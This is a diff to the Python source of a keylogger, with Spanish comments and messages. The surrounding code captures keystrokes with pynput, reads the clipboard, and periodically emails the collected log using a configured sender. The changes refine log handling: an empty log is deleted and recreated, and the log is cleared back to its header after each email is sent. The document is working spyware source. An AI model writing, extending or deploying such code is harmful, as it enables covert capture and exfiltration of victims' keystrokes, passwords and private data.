@@ -7,7 +7,7 @@ from pynput import keyboard
 from ctypes import WinDLL
 from platform import system, release
 from pyperclip import paste
-from os import getlogin
+from os import getlogin, remove
 from time import sleep
 from threading import Thread
 
@@ -30,6 +30,7 @@ class KeyLogger:
         self.__ruta_log = ""
         self.__fecha_inicio = ""
         self.__hora_inicio = ""
+        self.cabecera = ""
         self.__caracteres_cabecera = 0
         self.__caracteres_log = 0
         self.__hora_actual = 0
@@ -149,8 +150,8 @@ class KeyLogger:
 
         # Crear Cabecera
         caracteres_cabecera = len(f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}")
-        cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
-        self.__caracteres_cabecera = len(cabecera)
+        self.cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
+        self.__caracteres_cabecera = len(self.cabecera)
 
         # Verificar si Nombre del Log esta Vacio, Colocar Nombre Usuario
         if self.__nombre_log == "":
@@ -167,16 +168,38 @@ class KeyLogger:
 
         # Verificar si ya hay uno Existente
         try:
+
+            # Obtener Caracteres del Log
             with open(self.__ruta_log, "r") as log:
-                print("[!] Archivo Log Detectado, Se Continuara con el Archivo Existente")
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"\n\n{cabecera}")
                 self.__caracteres_log = len(log.read())
+
+            # Borrar y Crear si Esta Vacio
+            if self.__caracteres_log == self.__caracteres_cabecera:
+                print("[-] Eliminando Log Vacio...")
+                try:
+                    remove(self.__ruta_log)
+                except Exception:
+                    print("[!] No se Pudo Eliminar")
+                print("[+] Log Viejo Eliminado Correctamente")
+                print("[-] Creando Log Nuevo...")
+                crear_log = open(self.__ruta_log, "x")
+                crear_log.close()
+                print("[+] Log Nuevo Creado Correctamente")
+                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"{self.cabecera}")
+
+            # Agregar Contenido al Final si no Esta vacio
+            else:
+                print("[!] Archivo Log Detectado, Se Continuara con el Archivo Existente")
+                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"\n\n{self.cabecera}")
                 print(f"[+] Cargado Correctamente. Numero de Caracteres: {self.__caracteres_log}")
+
+        # Crear Archivo en Caso que no Exista
         except FileNotFoundError:
-            print("[!] Archivo Log No Encontrado, Se Creara uno Nuevo...")
-            open(self.__ruta_log, "x")
+            print("[-] Archivo Log No Encontrado, Creando uno Nuevo...")
+            crear_log = open(self.__ruta_log, "x")
+            crear_log.close()
             print("[+] Log Creado Correctamente")
-            self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"{cabecera}")
+            self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"{self.cabecera}")
         finally:
             print("[+] Todo Listo...")
             print("~~~~~~~~~~~~~~~~~~~\n")
@@ -185,7 +208,7 @@ class KeyLogger:
         self.__correo = Enviar_Email(ruta_config=self.__ruta_config, ruta_log=self.__ruta_log)
 
         # Imprimir Cabecera
-        print(cabecera)
+        print(self.cabecera)
 
         # Iniciar Listener
         self.__listener = keyboard.Listener(
@@ -273,6 +296,9 @@ class KeyLogger:
             if not respuesta_correo:
                 print(f"[!] Reenviando Correo en {self.__tiempo_reenviar_correo}s...")
                 sleep(self.__tiempo_reenviar_correo)
+        with open(self.__ruta_log, "w") as log:
+            print("[+] Se Limpio el log")
+            log.write(self.cabecera)
 
     # Calcular Horas Restantes del Envio
     def __calcular_horas_restantes(self):
